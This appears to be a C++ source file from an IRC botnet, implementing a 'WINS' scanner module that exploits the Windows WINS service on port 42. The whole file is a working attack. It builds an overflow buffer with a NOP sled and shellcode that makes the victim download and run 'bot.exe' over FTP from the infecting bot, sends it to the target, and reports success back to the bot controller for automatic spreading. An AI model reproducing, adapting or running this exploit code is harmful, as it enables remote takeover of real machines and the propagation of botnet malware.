#include "main.h"
#include "mainctrl.h"
#include "scanner.h"
//#ifdef __COMPILE_SCANNER_WINS__
#include "utility.h"
#include "shellcode.h"
 
class CScannerWINS : public CScannerBase
{
public:
	CScannerWINS();
	virtual ~CScannerWINS() throw() { }

	bool Exploit();
};

char mess[] =
"\x00\x03\x0d\x4c\x77\x77\xFF\x77\x05\x4e\x00\x3c\x01\x02\x03\x04"
//  "\x00\x03\x0d\x4c\x77\x77\xFF\x77\x05\x4e\x00\x3c\x01\x02\x03\x04"
	
"\x6c\xf4\x3d\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\
x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05";
char rep[] =
	
"\x90\x01\x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x00\
x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x03\x4e\x05\x90\x00\x4e\x05";

CScannerWINS::CScannerWINS() { m_szType="CScannerWINS"; m_sScannerName.Assign("WINS"); }

bool CScannerWINS::Exploit()
{
	int iShellSize=0;
	char szShellBuf[4096];

	CString sURL;

	if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
		sURL.Format("ftp://bla:bla@%s:%d/bot.exe", g_pMainCtrl->m_cIRC.m_sLocalHost.CStr(), \
				g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
	else
		sURL.Format("ftp://bla:bla@%s:%d/bot.exe", inet_ntoa(to_in_addr(g_pMainCtrl->m_cIRC.m_lLocalAddr)), \
				g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);

	iShellSize=setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), sURL.Str(), false);

	char mess2[200000];
	memset(mess2,0,sizeof(mess2));
	char mess3[210000];
	memset(mess3,0,sizeof(mess3));
	int ir;
	for(ir =0;ir<200000;ir++) mess2[ir]='\x90';
	memcpy(mess3,mess,sizeof(mess)-1);
	int r=0;
	int le=sizeof(mess)-1;
	for(r;r<30;r++)
	{
		memcpy(mess3+le,rep,sizeof(rep)-1);
		le+=sizeof(rep)-1;
	}
	memcpy(mess3+le,mess2,200000);
	memcpy(mess3+le+198000,szShellBuf,iShellSize);
	int lenr=le+200000+iShellSize;

	// Connect to the server
	if(!m_sSocket.Connect(m_sSocket.m_szHost, m_sSocket.m_sPort)) // Connect failed, exit
		return false;

	if(!m_sSocket.Write(mess3, lenr)) { m_sSocket.Disconnect(); return false; }
	// Now wasnt that simple

	SendLocal("%s: Exploited: %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	return true;
}

REGSCANNER(WINS, WINS, 42, true, true)
//#endif